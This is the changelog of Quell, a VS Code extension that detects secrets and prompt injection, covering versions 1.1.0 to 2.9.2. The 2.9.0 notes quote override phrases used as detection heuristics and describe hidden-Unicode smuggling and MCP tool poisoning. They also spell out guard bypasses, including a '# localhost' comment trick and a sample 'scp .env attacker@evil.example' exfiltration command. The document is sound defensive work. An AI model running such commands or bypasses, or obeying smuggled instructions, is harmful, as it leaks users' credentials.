# Changelog

All notable changes to Quell will be documented in this file.

## [2.9.2] - 2026-09-15

### Identity and links

- Updated repository, documentation and publisher-profile links for the GitHub
  account rename from `Sonofg0tham` to `craigmccart`.
- Prepared a metadata-only marketplace release so the VS Code Marketplace and
  Open VSX listings render the current GitHub links.
- Kept the established `Sonofg0tham` marketplace publisher ID and Open VSX
  namespace, preserving Quell's extension identity and existing update path.
- No runtime behaviour changed.

## [2.9.1] - 2026-07-28

### 📖 Documentation

The README described what each engine *does*. It never described what happens
to *you*, which made it possible to ship two detection engines and still not
know when you would hit either of them.

- **New [USAGE.md](USAGE.md)**: a "which part do I use when" table, numbered
  first-run setup, one worked scenario per engine, a table of what to do for
  each finding type including the ones that mean "do nothing", and an honest
  limitations section.
- The prompt-injection scenario shows the same README twice, once as a human
  sees it and once as the model sees it. That difference is the whole point and
  no amount of describing "Unicode Tags-block smuggling" conveys it.
- **Fixed docs naming commands that do not exist.** `Quell: Getting Started`
  was never registered — the walkthrough opens via `Welcome: Open Walkthrough`
  — and that error was already live in the published README. `Quell: Redact
  Active File` is really `Quell: Redact Secrets in Active File`. Every command
  and setting named in the docs is now checked against `package.json`, and
  every finding type against the scanner source.
- README links to USAGE.md are absolute, because relative links are unreliable
  once the README is rendered on the Marketplace. Engine count corrected from
  two to three.

### ⚙️ Release pipeline

- The build job packaged with an unpinned, deprecated `vsce` while the publish
  job pinned `@vscode/vsce@3.9.2`. Both are pinned now. The job that builds the
  artefact decides what ends up in it, so it matters at least as much as the
  one that uploads it.

### 🔌 MCP configuration auditing

MCP server configs are a first-rank credential leak source, because server
install instructions routinely tell you to paste an API token straight into the
config's `env` block and those files get committed. They are also an injection
surface: a server's tool `description` is read by the model and never by you,
which is what makes tool poisoning work.

New `McpGuard` in the scanner package, wired into **Scan Workspace**:

- Recognises the real config filenames (`.mcp.json`, `.cursor/mcp.json`,
  `.vscode/mcp.json`, `.windsurf/mcp_config.json`, `claude_desktop_config.json`)
  on both path separators.
- Flags hardcoded credentials in `env`, `headers` and — the shape an env-only
  scan misses entirely — in `command` and `args`, where `--token ghp_…` is a
  documented setup step for several popular servers. Arguments are worse than
  the file, because the process list exposes them to everything on the machine.
- Leaves `${VAR}` indirection alone. That is the recommended pattern, and
  flagging it would punish people for doing the right thing.
- Runs tool descriptions through `PromptGuard`, so a smuggled instruction in a
  description is decoded and named.
- Flags plain-HTTP transport to non-local hosts, and notes remote servers as
  informational.
- **Never reports a secret value**, only the key that held it and the credential
  type. A module whose whole purpose is finding secrets is the last place to
  start copying them into findings.

Detection is delegated to `SecretScanner` and `PromptGuard` rather than
reimplemented. An earlier draft grew its own "does this look secret?" heuristic
and, on review, fired `high` on ordinary version strings and paths. Config files
are full of innocent values, so a third false-positive surface was not worth
having.

### 🧹 Corrections

Two items previously listed as open gaps were already fixed in 2.9.0 and the
notes were stale: the vault-index read-modify-write race (`queueVaultIndexOp`
already serialises every mutation) and the Claude Code deny-rule writer
(`AiShieldManager._writeClaudeDeny` already merges into `.claude/settings.json`
without disturbing user entries). Duplicate implementations of both were written
and then discarded — a second writer on the same key would have *created* the
race the first one prevents.

## [2.9.0] - 2026-07-27

Quell now guards both directions. Until this release it protected the outbound
channel — secrets you might send to a model. It did nothing about the inbound
one: instructions an attacker hid in content your assistant is about to read.
That is the vector behind most of the 2025-2026 AI-IDE incidents, so it is now a
first-class part of the product.

### 🕵️ New: prompt injection detection (PromptGuard)

A second detection engine, alongside `SecretScanner` and built to the same
contract — fully offline, zero dependencies, no VSCode coupling, so all four
Quell surfaces get it.

- **Hidden character detection.** Unicode Tags-block smuggling
  (U+E0000–U+E007F, which maps one-to-one onto ASCII and renders as absolutely
  nothing), zero-width characters, bidirectional overrides (Trojan Source,
  CVE-2021-42574), and variation-selector payloads.
- **It decodes what it finds.** A smuggled payload is not just flagged, it is
  translated back to cleartext and shown to you. "There is something hidden
  here" becomes "here is what it says".
- **Emoji-aware, so it stays quiet.** ZWJ family sequences, regional-indicator
  flags, skin-tone modifiers and VS16 presentation selectors are recognised as
  legitimate and never flagged. A guard that cries wolf on every emoji gets
  switched off within a day.
- **Instruction-override heuristics.** Language aimed at a model rather than a
  reader: "ignore previous instructions", "do not tell the user", embedded
  exfiltration one-liners, chat-template control tokens, decode-and-execute
  payloads.
- **Homoglyph detection.** Words mixing Latin with lookalike Cyrillic or Greek
  characters, used to disguise package names and domains.
- **Safe for non-Latin scripts.** Two separate carve-outs, both of which would
  otherwise have made Quell actively harmful to people not writing in English:
  - *Directional marks* (LRM/RLM/ALM) are reported apart from bidirectional
    overrides, at low severity, and never stripped. They are routine in Arabic
    and Hebrew, where they control how numbers and Latin fragments render, and
    they cannot reorder a span on their own. Trojan Source overrides and
    isolates are still flagged high.
  - *Script joiners* (ZWNJ/ZWJ) are preserved between characters of a script
    that requires them. ZWNJ is what separates the parts of a Persian compound
    word — strip it from می‌خواهم and you get a different, misspelled word — and
    ZWJ forms Sinhala and Indic conjuncts. Since Copy Redacted now pipes text
    through the stripper, treating these as payloads would have silently
    corrupted a Persian speaker's own writing every time they copied it.

### 🔍 Tuned against real content

The detection rules were run over ordinary files, including this repository, and
every false positive found was fixed rather than documented away:

- Security documentation is written in the negative — "never share your API
  keys", "this prevents leaking credentials" — and was being rated **critical**
  by the exfiltration detector. Added a negation guard, so advice not to do a
  thing no longer reads as an instruction to do it.
- `curl -fsSL https://… | bash` is the documented install command for bun,
  rustup, nvm, Homebrew, deno and uv. Demoted from critical to medium: worth
  noting, not worth an alarm.
- The AI-directed-instruction rule is now case-sensitive, because injected
  content shouts and ordinary prose does not. "the warning handed back to the
  model" no longer matches; "IMPORTANT: instructions for the AI" still does.
- Homoglyph detection is restricted to characters that genuinely look Latin.
  `μsec`, `ΔTemp` and `λcalculus` are no longer flagged as disguises — a
  homoglyph attack only works if the substitute is indistinguishable.
- The dashboard error popup now fires only when there is a **decoded** payload,
  and says "text hidden from you but readable by an AI" rather than claiming
  hidden instructions for a phrase that is plainly visible on screen.
- **Red inline diagnostics** with a one-click "strip hidden characters" fix.
  Stripping is safe by construction: the characters removed are invisible, so
  the visible meaning of your text cannot change.
- New commands: **Scan Workspace for Prompt Injection** and **Strip Hidden
  Characters from Active File**. New `quell.injection.*` settings, all on by
  default, each detector family individually toggleable.
- Hidden characters are now stripped at both clipboard boundaries. **Copy
  Redacted** cleans text on the way out, because copying a poisoned snippet into
  a chat window would otherwise inject the assistant using your own hands.
  **Sanitised Paste** cleans on the way in, because pasting from a browser or a
  colleague is how a smuggled payload gets committed to a repository in the
  first place.

### 🔒 Security fixes

- **`.env` context leak (High).** `@quell /context` redacted line-by-line and
  only masked lines containing `=`. A multi-line quoted value — exactly how PEM
  private keys and service-account JSON are stored — had its body emitted
  verbatim, and base64 lines ending in `=` padding were parsed as key names and
  printed in clear. The parser now tracks quoted continuations, never echoes a
  line it cannot parse, and the assembled output gets a second independent pass
  through the secret scanner before it is shown.
- **Exfiltration guard bypass (High).** The `PreToolUse` hook suppressed itself
  whenever the word "localhost" appeared *anywhere* in a command, so appending
  `# localhost` disabled it entirely — a one-token bypass trivially available to
  the injected agent it exists to catch. Suppression is now based on the parsed
  destination host, and requires every destination to be loopback. URL userinfo
  is stripped, so `http://127.0.0.1@evil.example` is correctly read as external.
- **Dead dashboard controls (High).** Every button used an inline `onclick`
  handler, which a nonce-based CSP refuses by design — the whole dashboard UI
  was inert. Rewired to delegated listeners inside the nonced script block. The
  CSP was not weakened to achieve this.
- **Webview exfiltration channel (Medium).** `img-src` allowed arbitrary
  `https:` images, which is a working outbound channel for a panel that displays
  your file paths and detected secret types. Now restricted to extension-local
  resources and `data:`, with `connect-src`, `form-action` and `base-uri`
  locked to `'none'`.

### 🎯 Detection reach

- **The scan finally covers the files that actually carry injections.**
  `AGENTS.md`, `CLAUDE.md`, `README.md`, `.cursorrules`, `.clinerules`,
  `copilot-instructions.md` and other agent-instruction files were previously
  outside every scan Quell performed, despite being the documented carrier for
  rules-file backdoor attacks. Markdown and rules files are now in scope for
  both engines.
- **MCP configuration is now shielded.** `.mcp.json`, `.cursor/mcp.json`,
  `.vscode/mcp.json`, `claude_desktop_config.json` and friends routinely carry
  API tokens inline, because that is what server install instructions tell you
  to do.

### 🪝 Claude Code plugin

- **New `PostToolUse` hook.** Scans content the agent *reads* — files, fetched
  pages, search results — for injection, and on a hit tells the model the
  content is data rather than instruction. It warns rather than blocks: the
  model is better placed to judge intent once it has been told to be suspicious.
- **Exfiltration guard widened.** Now covers DNS-based exfiltration via
  `ping`/`dig`/`nslookup` (the CVE-2025-55284 vector), two-step staging to temp
  paths, git-remote exfiltration, PowerShell transfer cmdlets, and
  `/proc/self/environ`. A single `$VAR` in an auth header is still deliberately
  ignored — that is normal work, not a dump.
- **Second loopback bypass closed.** Scoping the exemption to parsed URL hosts
  fixed the `# localhost` comment trick but left a subtler one: `scp`, `ssh`,
  `rsync` and `nc` carry their destination as `user@host:path`, which URL
  parsing cannot see, so an unrelated loopback URL elsewhere in the command
  suppressed them. `scp .env attacker@evil.example:/tmp/x && echo
  http://localhost/done` is now correctly flagged. Scheme-less tools are judged
  independently of any URL.
- **Quieter on everyday commands.** `--host` no longer reads as the `host` DNS
  tool, `/ping` in a URL path no longer reads as the `ping` command,
  `.env.example` is treated as the template it is, and a home path counts as
  staging only when it follows a redirect — so `cp ~/templates/.env.example
  .env` stays silent. Routine prompts train people to approve reflexively,
  which costs more security than it buys.

### 🛡️ AI Shield

- Added `.cursorindexingignore`, `.geminiignore`, `.clineignore`, `.rooignore`,
  `.augmentignore` and `.llmignore`.
- **Claude Code deny rules.** AI Shield now also writes `permissions.deny` into
  the workspace's `.claude/settings.json`. This is the only mechanism in the
  whole list that stops a shell read as well as indexing, so it is the only one
  that survives agent mode. It merges rather than templating: your existing
  settings and your own deny rules are preserved, only Quell's rules are added
  or removed, and a settings file that cannot be parsed is left untouched —
  destroying configuration to enforce a preference would be a worse outcome
  than the shield missing one tool.
- Added an honest **coverage matrix**: which tools the shield actually protects,
  and which bypass it in agent or terminal mode. Notably, Copilot has no
  per-developer exclusion at all, and `.claudeignore` does not exist — claiming
  otherwise would imply protection that is not there.

### ⚙️ Supply chain

- All GitHub Actions pinned to full commit SHAs.
- `vsce` and `ovsx` pinned to exact versions in the release job, which holds the
  marketplace PATs.
- Least-privilege `permissions` on every workflow; `contents: write` scoped to
  the one job that needs it.
- The PR triage workflow was sitting in `.github/` rather than
  `.github/workflows/`, so it had never run. Moved, and its auto-merge gate —
  which matched "LOW" anywhere in the text, including inside "follow" and
  "allowed" — now anchors to the heading line and fails closed.

## [2.8.1] - 2026-07-11

A visual identity and hardening release. No detection changes.

### 🎨 Visual identity
- **New brand: the Sealed-Q.** Quell's icon is now a geometric ring whose
  counter is blocked by a redaction bar in still-water aqua, echoing the
  `{{SECRET_xxx}}` placeholders. Replaces the old magnifying-glass icon
  across the extension icon, the sidebar icon, and the README, which now
  carries the new wordmark and a social preview card. Brand tokens are
  locked in `brand.md` and `brand-theme.css`.
- Replaced the retired shields.io VS Marketplace badges with a working
  static badge.

### 🔒 Security hardening
- **ReDoS guard.** The URL credential-detection regex now carries length
  limits, closing a CodeQL polynomial-ReDoS alert.
- **TOCTOU fixes.** AI Shield file reads no longer race between existence
  check and read; missing files are handled by try/catch instead.
- Removed unused imports flagged by CodeQL.

### 🧰 Maintenance
- Dependency and CI action bumps (@types/vscode 1.125, @types/node
  20.19.43, checkout v7, setup-node v6, codeql-action v4,
  action-gh-release v3).

## [2.8.0] - 2026-06-25

A security-hardening release. Every change that touches a secret now fails safe,
and the test suite that guards detection is enforced in CI for the first time.

### 🔒 Security hardening
- **Honest redaction.** Every editor edit that redacts or restores a secret now
  checks that the write actually succeeded. If VSCode rejects the edit, Quell
  rolls back the vault entry and tells you the secret is still exposed, instead
  of falsely reporting success.
- **Restore can't cross files.** Restoring real values now re-validates the active
  editor first and aborts if you've switched files, so secrets can never be written
  back into the wrong document.
- **Secrets leave memory on close.** Cleartext secrets are pruned from the in-memory
  map the moment a document closes, rather than lingering for the whole session.
- **Path-traversal guard.** `Open File` from the sidebar now refuses any path that
  resolves outside the workspace.
- **Atomic shield writes.** AI Shield ignore-file updates are written atomically and
  never delete a file Quell did not create.
- **Webview CSP.** The sidebar dropped `unsafe-inline` for a per-render nonce.
- Full 32-character placeholder IDs (was truncated to 16); hover command-trust scoped
  to a single command.

### 🔍 Detection
- **New patterns:** encrypted private keys (`BEGIN ENCRYPTED PRIVATE KEY`) and Slack
  `xoxe` refresh / app-config tokens.
- **Broadened** GitHub fine-grained PAT matching, which was missing real tokens whose
  segment lengths differed from the assumed fixed sizes.
- **Closed** a base64 entropy-skip hole that let very long tokens slip past the scanner.
- **Overlap fix:** longer secrets are redacted before shorter ones, so a short secret
  that is a prefix of a longer one can no longer fragment it and leak the tail.

### 🛡️ Cross-surface coverage
- AI Shield now writes the **correct ignore filenames** for Windsurf (`.codeiumignore`)
  and Antigravity (`.aiexclude`) alongside the existing ones.
- **Clipboard Sentry** warning gained a one-click **"Sanitise Now"** button, and now
  logs read/write errors instead of swallowing them silently.

### 🧪 Tests & CI
- **CI test gate.** A new workflow runs the scanner and plugin test suites on every push
  and pull request, and blocks a release if any test fails.
- **Scanner drift guard.** CI fails if the Claude Code plugin's bundled scanner copy
  diverges from source.
- Scanner suite grew by 6 regression tests (84 total); the plugin hook suite went from
  3 to 6 tests.

### 🧹 Internal
- Removed a dead hex-entropy branch and unreachable allowlist entries; the entropy
  tokeniser now splits on `<`, `>` and `|`.
- First-install scan timer is cleared on deactivate.
- The Claude Code hook always writes its fail-open reason to stderr (previously gated
  behind `QUELL_DEBUG`).

## [2.7.0] - 2026-04-23

### 🔍 New Detection Patterns
- **OpenRouter API Key** (`sk-or-v1-...`) — multi-model routing for AI apps
- **Groq API Key** (`gsk_...`) — fast inference provider
- **Perplexity API Key** (`pplx-...`) — search-augmented LLM
- **xAI API Key** (`xai-...`) — Grok models
- **LangSmith API Key** (`lsv2_pt_...` / `lsv2_sk_...`) — LLM tracing & eval

### 🧹 Pattern Hygiene
- **Tightened** Mailgun regex to hex-only (was accepting any 32-char alphanumeric after `key-`)
- **Tightened** Okta regex with word boundaries (was firing on any `00`-prefixed string)
- **Removed** Cohere `co-` pattern — prefix is too generic; entropy pass catches the real keys
- **Removed** Heroku — loose regex with no test coverage, platform usage declining
- **Removed** Firebase Cloud Messaging legacy pattern — Google deprecated the legacy FCM API
  in June 2024. OAuth service accounts are still covered by the existing Google pattern.

### 🎨 UI
- **Activity-bar sidebar icon** redesigned as a circle with a redaction-bar tail (the Quell
  mark), using `currentColor` so it recolours with the VSCode theme instead of always
  rendering blue.
- **Marketplace icon** replaced — the 3D crystal render is gone. The new flat two-tone mark
  uses Quell blue (`#60A5FA`) for the circle and a coral accent (`#F97316`) for the
  redaction bar, matching the sidebar silhouette so both surfaces read as one product.
- **`assets/icon.svg`** added as the vector master for the Marketplace PNG, so future size
  variants and theme adjustments can be regenerated without losing quality.

## [2.6.0] - 2026-04-22

### 🔍 New Detection Patterns
- **PlanetScale API Token** (`pscale_tkn_...`) — database branching platform
- **Resend API Key** (`re_...`) — transactional email API
- **Linear API Key** (`lin_api_...`) — project management API

### 🧪 Scanner Correctness
- **PostgreSQL URI double-detection regression test** — added explicit tests confirming a
  PostgreSQL connection URI is always counted as a single secret, even when the embedded
  password is high-entropy. Guards against future regressions in the detection pipeline.

### 📝 Notes
- Lemon Squeezy keys are JWTs and were already covered by the JSON Web Token pattern.
- Mistral, Loops, and Neon keys have no distinctive token prefix; they are caught by the
  Shannon entropy pass (threshold 4.5 bits).

## [2.5.1] - 2026-04-20

### 🔧 Publish Fix
- **VSIX test file exclusion** — `.vscodeignore` now excludes compiled test files
  (`out/packages/scanner/src/test/**`, `packages/scanner/dist-test/**`,
  `packages/scanner/src/test/**`). The VS Code Marketplace secret scanner was
  flagging test fixture strings in compiled test output as real secrets. Test files
  have no place in a published extension.

## [2.5.0] - 2026-04-17

### 🛡️ Vault Management
- **Clear Vault command** — `Quell: Clear Vault (delete all stored secrets)` permanently removes all secrets from the OS Keychain. Uses a `globalState`-backed index (since VSCode SecretStorage has no enumeration API) to track which placeholders have been stored. Includes a modal confirmation before deleting.

### ⚙️ Test Key Filtering
- **`quell.redactTestKeys` setting** (default: `false`) — officially-published test/demo credentials (e.g. `AKIAIOSFODNN7EXAMPLE`) are now left alone by default, since they are intentionally safe and appear in READMEs and tutorials. Set to `true` to redact them like any other secret.

### 🔒 Security Hygiene
- **Placeholder length increased** — `{{SECRET_...}}` identifiers now use 16 hex characters (up from 12) for better collision resistance across large vaults.
- **CodeQL CI** — GitHub Actions workflow added: CodeQL security scan runs on every push/PR to `main` and weekly. Uses `security-extended` + `security-and-quality` query suites. The security tool now scans itself.

### 📋 Contribution scaffolding
- Added `CONTRIBUTING.md`, issue templates (bug, feature, pattern suggestion), and security advisory redirect.

### 🔐 Security
- **Webview command allowlist** — the sidebar webview now validates every `executeCommand` message against an explicit `ALLOWED_COMMANDS` set. Previously any webview message could trigger arbitrary VSCode commands; now only the 11 permitted Quell commands are accepted. Eliminates a webview RCE vector.

### ⚡ Performance
- **O(1) duplicate-secret deduplication** — `SecretScanner.redact()` previously used `string.split().join()` and a linear `Map.has()` scan to deduplicate secrets. Now uses a reverse `valueToPlaceholder` Map for O(1) lookup and `String.replaceAll()` with a callback, improving performance on large files with repeated secrets.

### ♿ Accessibility
- **ARIA descriptions on toggle buttons** — the AI Shield and Auto-Sanitize toggle buttons in the sidebar now carry `aria-describedby` attributes pointing to descriptive hint text, improving screen reader experience.

### 📦 Dependencies
- `@types/vscode` bumped from `^1.90.0` to `^1.115.0` — picks up 25 releases of API type definitions.

## [2.4.0] - 2026-03-22

### 🎓 Native Onboarding Walkthrough
- **Getting Started walkthrough** — new users now see a 5-step guided walkthrough in the VSCode Welcome page on first install: explains what Quell does, runs a live demo with fake credentials, teaches the two key shortcuts, sets up AI Shield, and builds trust in the offline/keychain privacy model
- **Demo file command** — `Quell: Open Demo File` opens an untitled file with fake AWS credentials so you can watch detection and redaction in action

### 🔔 Smarter Save Warnings
- **Session-level dismissal** — save warnings now include a "Dismiss for this session" button. Once dismissed, that file stays silent for the rest of the session unless you add new secrets (in which case the warning comes back)
- Previously the warning fired on every single save of a file containing secrets — this was the most common source of noise

### ⚙️ Default Change
- **`confirmBeforeRedact` now defaults to `false`** — the modal confirmation before redacting has been turned off by default. It blocked the editor on every redaction and added friction without benefit for most workflows. You can re-enable it in Settings if you want the extra prompt

### 🔒 Added Patterns
- **Supabase Publishable Key** (`sb_publishable_...`) — new Supabase anon key format
- **Supabase Secret Key** (`sb_secret_...`) — new Supabase service role key format

## [2.3.0] - 2026-03-14

### 🛡️ Smarter Quick Fix
- **Per-secret Quick Fix** — the `💡` lightbulb now offers "Redact this secret" to replace a single flagged secret inline, alongside the existing "Redact all secrets in file" option

### 🔍 Better First-Run Experience
- Clean workspaces now show a confirmation toast on first install instead of silence
- Initial scan now notes if your workspace exceeded the 50-file preview limit and prompts a full scan

### ⚙️ Reliability
- Invalid custom regex patterns now log a warning in the Quell output channel instead of silently failing
- Marketplace: added gallery banner and improved keywords for discoverability

## [2.2.0] - 2026-03-11

### ✨ Cursor & Windsurf Protection
- **Clipboard Auto-Sanitize** — when enabled, Quell monitors your clipboard every second and automatically replaces copied secrets with safe `{{SECRET_...}}` placeholders before you can paste them into native AI chats
- **Dashboard toggle** — enable/disable Auto-Sanitize directly from the Quell sidebar (no need to find it in settings)
- Auto-dismiss notification (5s timeout) when secrets are sanitized

### 🔍 Live Editor Diagnostics
- **Inline secret warnings** — exposed secrets now show yellow squiggly underlines in the editor in real-time
- **Problems Panel** integration — all detected secrets appear in VS Code's Problems tab
- **Quick Fix lightbulb** — click 💡 or press `Ctrl+.` to instantly redact secrets from the editor

### 🐛 Major False Positive Reduction
- Removed `secret` keyword from Password regex (too common in code like `console.error('secret:', ...)`)
- Password/Token regexes no longer match across line breaks and are length-capped
- Entropy scanner now skips: SCREAMING_SNAKE_CASE identifiers, camelCase/PascalCase variables, dotted property access, env variable references, webpack identifiers, URL-encoded paths, base64 source maps, base32/base36 character sets, minified CSS/JS fragments
- Workspace scan excludes: `package-lock.json`, `yarn.lock`, `pnpm-lock.yaml`, `.next*/`, `.nuxt/`, `.vercel/`, `_next/`, `static/chunks/`

### 🛠 UX Improvements
- **Sidebar buttons now work without clicking into the editor first** — Redact File, Restore Secrets, etc. operate on the last focused file
- **Clickable findings** in the dashboard — click a file in the Findings list to open it directly
- Clipboard Sentry warning now offers one-click "Enable Auto-Sanitize" button
- Clipboard polling interval reduced from 3s to 1s for faster interception

## [2.1.0] - 2026-03-11

### ✨ Rebrand: Quell
- **Renamed from VyberGuard to Quell** — new identity across all UI, commands, and branding
- Cleaned up all internal identifiers, settings, and command IDs to use `quell.*`
- Updated AI Shield markers and status bar branding

## [2.0.0] - 2026-03-05

### ✨ Redesign & Identity
- **Consolidated identity as VyberGuard** (previously VibeGuard)
- **Premium sidebar redesign** — glassmorphism cards, teal accent gradients, pulse animations, breathing status dot, shimmer effects, and refined typography
- **Updated extension icon** — sleek shield + lock design

### Fixed
- Payment provider regex (Stripe, PayPal, Square) now catches a wider range of key formats, including keys with underscores and varying lengths
- Sidebar "Intercepted" label renamed to "Detected" for clarity — Scan All finds secrets, it doesn't redact them
- Stale "VibeGuard" references cleaned up across all files

## [1.5.0] - 2026-02-28

### Added
- **AI Indexing Shield** — one-click protection that generates `.cursorignore`, `.windsurfignore`, `.antigravityignore`, `.aiderignore`, and `.aiignore` files to block AI IDEs from reading secret files
- **Copy Redacted** (`Ctrl+Shift+C`) — copies selected text with secrets replaced by `{{SECRET_...}}` placeholders, ready to paste into any AI chat
- **Sanitized Paste** (`Ctrl+Shift+V`) — pastes clipboard content with secrets automatically stripped
- **Clipboard Sentry** — passive clipboard monitoring that warns when a secret is detected on your clipboard (polls every 3 seconds, purely informational)
- **Vibe Check** — automatic first-install workspace scan with actionable "Enable AI Shield" notification
- **Premium sidebar dashboard** — activity bar panel with shield toggle, session stats, findings list, tool grid, and engine info
- **Exposure badge** in status bar showing raw secret count after workspace scan

### Changed
- Status bar now shows multiple states: idle, AI Shield ON, scanning, alert, clean
- Sidebar includes live session statistics (scans count, detected secrets)

## [1.1.0] - 2026-02-23

### Added
- 75+ secret detection patterns (up from 14) covering AWS, Google, Azure, OpenAI, Anthropic, Stripe, GitHub, GitLab, Slack, Discord, JWTs, database connection strings, private keys, and more
- Shannon Entropy analysis for catching unknown/proprietary API keys
- Status bar indicator with live scanning/alert/safe states
- Dedicated Output Channel logging ("Quell" in Output panel)
- User-configurable settings: entropy toggle, threshold, min token length, custom patterns, whitelisting, inline decorations, confirmation dialog
- Inline editor decorations for placeholder tokens (orange borders + 🔒 icons)
- "Redact Selection" command with context menu integration
- "Scan Workspace" command for full project scanning
- File save watcher that warns about raw secrets
- Confirmation dialog before file redaction
- Comprehensive test suite (56 tests)
- README and extension icon

### Fixed
- Basic Auth regex was broken (only matched 1 character instead of full credentials)
- `EnvManager` used blocking `fs.readFileSync` — now uses async `vscode.workspace.fs.readFile`
